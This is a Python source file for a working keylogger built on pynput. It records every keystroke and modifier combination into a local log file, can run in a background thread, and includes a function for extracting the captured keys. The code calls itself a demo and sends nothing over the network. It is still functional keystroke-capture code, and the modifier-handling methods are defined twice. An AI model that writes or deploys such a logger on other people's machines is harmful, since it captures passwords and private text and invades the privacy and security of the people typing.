import datetime
import os
import sys
import threading
import time
from typing import List, Dict, Set, Union, Optional

from pynput import keyboard


KeyType = Union[keyboard.Key, keyboard.KeyCode]


class KeyboardHandler:
    """
    Handles keyboard events in three modes:
    - L: Log
    - I: Inject (ignore local logging)
    - E: Extract (WIP)
    """

    # Mapping for all the special / function keys we care about
    SPECIAL_KEYS: Dict[keyboard.Key, str] = {
        keyboard.Key.shift: "Shift",
        keyboard.Key.shift_l: "LShift",
        keyboard.Key.shift_r: "RShift",
        keyboard.Key.ctrl: "Ctrl",
        keyboard.Key.ctrl_l: "LCtrl",
        keyboard.Key.ctrl_r: "RCtrl",
        keyboard.Key.alt: "Alt",
        keyboard.Key.alt_l: "LAlt",
        keyboard.Key.alt_r: "RAlt",
        keyboard.Key.cmd: "Meta",
        keyboard.Key.cmd_l: "LMeta",
        keyboard.Key.cmd_r: "RMeta",

        keyboard.Key.enter: "Enter",
        keyboard.Key.space: "Space",
        keyboard.Key.backspace: "Backspace",
        keyboard.Key.tab: "Tab",
        keyboard.Key.esc: "Esc",

        keyboard.Key.up: "Up",
        keyboard.Key.down: "Down",
        keyboard.Key.left: "Left",
        keyboard.Key.right: "Right",

        keyboard.Key.delete: "Delete",
        keyboard.Key.home: "Home",
        keyboard.Key.end: "End",
        keyboard.Key.page_up: "PageUp",
        keyboard.Key.page_down: "PageDown",

        keyboard.Key.f1: "F1",
        keyboard.Key.f2: "F2",
        keyboard.Key.f3: "F3",
        keyboard.Key.f4: "F4",
        keyboard.Key.f5: "F5",
        keyboard.Key.f6: "F6",
        keyboard.Key.f7: "F7",
        keyboard.Key.f8: "F8",
        keyboard.Key.f9: "F9",
        keyboard.Key.f10: "F10",
        keyboard.Key.f11: "F11",
        keyboard.Key.f12: "F12",
    }

    MODIFIER_KEYS: Set[keyboard.Key] = {
        keyboard.Key.shift, keyboard.Key.shift_l, keyboard.Key.shift_r,
        keyboard.Key.ctrl, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r,
        keyboard.Key.alt, keyboard.Key.alt_l, keyboard.Key.alt_r,
        keyboard.Key.cmd, keyboard.Key.cmd_l, keyboard.Key.cmd_r,
    }

    # Canonical logical names for modifier keys
    CANONICAL_MODIFIERS: Dict[keyboard.Key, str] = {
        keyboard.Key.shift: "Shift",
        keyboard.Key.shift_l: "Shift",
        keyboard.Key.shift_r: "Shift",
        keyboard.Key.ctrl: "Ctrl",
        keyboard.Key.ctrl_l: "Ctrl",
        keyboard.Key.ctrl_r: "Ctrl",
        keyboard.Key.alt: "Alt",
        keyboard.Key.alt_l: "Alt",
        keyboard.Key.alt_r: "Alt",
        keyboard.Key.cmd: "Meta",
        keyboard.Key.cmd_l: "Meta",
        keyboard.Key.cmd_r: "Meta",
    }

    def __init__(self, mode: str = "L", log_file: str = "log.txt") -> None:
        # Are we in key logging mode or in key injection mode?
        # Log -> L, Inject -> I , Extract -> E (Default mode is Log)
        self.mode: str = mode

        # Time range for what is one sitting of typing:
        self.time_range_for_till_inactive: int = 30  # seconds
        self.time_last_logging: float = 0.0

        self.start_time_of_logging: str = time.strftime("%H:%M:%S", time.localtime())
        self.last_press_time: float = 0.0

        # Rolling buffer of keystrokes normalizing strings)
        self.keystrokes_recorded: List[str] = list()
        self.keystrokes_recorded_size: int = 100

        self.log_file: str = log_file

        # Current modifiers being held down (e.g. {"Ctrl", "Shift"})
        self.pressed_modifiers: Set[str] = set()

        self.keystrokes_cache: Dict[int, str] = dict()
        self.keystrokes_cache_size: int = 100

        # Initialize log header
        self._write_session_header()

    # ---------- Public Interface ----------

    def start_in_background(self) -> None:
        t = threading.Thread(target=self.start, daemon=True)
        t.start()

    def start(self) -> None:
        """Starts the keyboard listener (blocking call)."""
        with keyboard.Listener(
            on_press=self.on_press,
            on_release=self.on_release,
        ) as listener:
            listener.join()

    # ---------- Internal helpers ----------

    def _write_session_header(self) -> None:
        with open(self.log_file, "a") as f:
            f.write("\n" + "=" * 50 + "\n")
            f.write(f"Session started: {datetime.datetime.now()}\n")
            f.write("=" * 50 + "\n")

    def _normalize_special_key(self, key: keyboard.Key) -> str:
        """Return a normalized string for a special key."""
        return self.SPECIAL_KEYS.get(key, f"Unknown({key})")

    def _normalize_char_key(self, key_code: keyboard.KeyCode) -> Optional[str]:
        """Return the character for a KeyCode, or None if unavailable."""
        try:
            return key_code.char
        except AttributeError:
            return None

    def _update_modifiers_on_press(self, key: keyboard.Key) -> None:
        name = self.SPECIAL_KEYS.get(key)
        if name and key in self.MODIFIER_KEYS:
            self.pressed_modifiers.add(name)

    def _update_modifiers_on_release(self, key: keyboard.Key) -> None:
        name = self.SPECIAL_KEYS.get(key)
        if name and key in self.MODIFIER_KEYS:
            # Remove all forms of the same logical modifier if you want
            # e.g. releasing RShift clears Shift + RShift
            to_remove = {m for m in self.pressed_modifiers if m.endswith(name) or m == name}
            if not to_remove:
                to_remove = {name}
            self.pressed_modifiers.difference_update(to_remove)

    def _record_keystroke(self, token: str) -> None:
        """Append a keystroke to the rolling buffer and file."""
        # Rolling buffer
        self.keystrokes_recorded.append(token)
        if len(self.keystrokes_recorded) > self.keystrokes_recorded_size:
            self.keystrokes_recorded.pop(0)

        # Logging to file
        self.write_to_file(token + "\n")

    # ---------- Key press/unpress handling Event callbacks ----------
    def _update_modifiers_on_press(self, key: keyboard.Key) -> None:
        # Use canonical names instead of raw SPECIAL_KEYS names
        name = self.CANONICAL_MODIFIERS.get(key)
        if name:
            self.pressed_modifiers.add(name)

    def _update_modifiers_on_release(self, key: keyboard.Key) -> None:
        name = self.CANONICAL_MODIFIERS.get(key)
        if name:
            self.pressed_modifiers.discard(name)

    def on_press(self, key: KeyType) -> None:
        """Handle key press event."""

        current_time = time.time()
        time_since_last_press = current_time - self.last_press_time
        self.last_press_time = current_time

        print(f"Time since last key press: {time_since_last_press:.2f} seconds")

        if not self.mode == "L": # If not in logging mode
            return

        # Special keys (including modifiers)
        if isinstance(key, keyboard.Key):
            if key in self.MODIFIER_KEYS:
                self._update_modifiers_on_press(key)

            key_name = self._normalize_special_key(key)

            # For a pure modifier press, we want the CANONICAL name (Ctrl, Shift, etc.)
            if key in self.MODIFIER_KEYS:
                combo = "+".join(sorted(self.pressed_modifiers)) or key_name
            else:
                combo = key_name

            self._record_keystroke(f"<{combo}>")
            return

        # Character keys (unchanged)
        if isinstance(key, keyboard.KeyCode):
            char = self._normalize_char_key(key)
            if char is None:
                return

            if self.pressed_modifiers:
                mods = "+".join(sorted(self.pressed_modifiers))
                token = f"{mods}+{char}"
            else:
                token = char

            self._record_keystroke(token)

    def on_release(self, key: KeyType) -> bool | None:
        """Handle key release event."""
        # Update modifier tracking
        if isinstance(key, keyboard.Key) and key in self.MODIFIER_KEYS:
            self._update_modifiers_on_release(key)

        # Stop demo on Esc
        if key == keyboard.Key.esc:
            print("\n\n[DEMO STOPPED] ESC key pressed")
            return False

        return None

    # ---------- EXTRATION: ---------- 
    def extract_logged_keys(self, source: str = "memory", limit: Optional[int] = None) -> List[str]:
        """
        Extract logged keystrokes.
        :param source: "memory" or "file"
            - "memory": returns the in-memory rolling buffer (what this process saw)
            - "file":   parses the log file and returns tokens (last session only)
        :param limit: if given, only return the last N tokens
        :return: list of normalized keystroke tokens, e.g. ["h", "e", "l", "l", "o", "<Backspace>"]
        """

        if source == "memory":
            data = list(self.keystrokes_recorded)  # shallow copy
            if limit is not None:
                return data[-limit:]
            return data

        if source == "file":
            if not os.path.exists(self.log_file):
                return []

            with open(self.log_file, "r") as f:
                lines = f.readlines()

            # Split file into sessions by the "====" header line,
            # and only consider the last session.
            sessions: List[List[str]] = []
            current: List[str] = []

            for line in lines:
                if line.strip().startswith("=" * 10):  # matches "==========..." header line
                    # new session starts
                    if current:
                        sessions.append(current)
                        current = []
                    # don't include header line as a keystroke
                    continue
                current.append(line.rstrip("\n"))

            if current:
                sessions.append(current)

            if not sessions:
                return []

            last_session_lines = sessions[-1]

            # Now filter out empty lines and return tokens as-is
            tokens = [ln for ln in last_session_lines if ln.strip()]

            if limit is not None:
                return tokens[-limit:]
            return tokens

        # Fallback: unknown source
        raise ValueError(f"Unknown extraction source: {source!r}")


    # I/O helpers
    def write_to_file(self, key_data: str) -> None:
        with open(self.log_file, "a") as f:
            f.write(key_data)


def main() -> None:
    handler = KeyboardHandler(mode="L", log_file="log.txt")
    handler.start()

if __name__ == "__main__":
    main()
